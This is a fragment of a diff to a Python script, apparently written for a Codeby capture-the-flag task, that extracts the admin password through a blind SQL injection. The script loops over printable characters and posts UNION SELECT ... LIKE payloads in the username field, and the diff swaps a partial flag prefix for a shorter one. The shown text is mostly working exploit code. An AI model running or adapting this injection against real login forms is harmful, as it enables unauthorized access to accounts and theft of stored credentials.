@@ -73,7 +73,8 @@ for char in printable_chars:
     
     # Подготавливаем данные для POST‑запроса
     data = {
-        "username": f"' UNION SELECT * FROM users WHERE username='admin' AND password LIKE 'flag_codeby_1og25ka9psv4as{pattern}'--",
+        #"username": f"' UNION SELECT * FROM users WHERE username='admin' AND password LIKE 'flag_codeby_1og25ka9psv4as{pattern}'--",
+        "username": f"' UNION SELECT * FROM users WHERE username='admin' AND password LIKE 'f{pattern}'--",
         "password": "admin"
     }
     response = session.post(base_url, data=data)
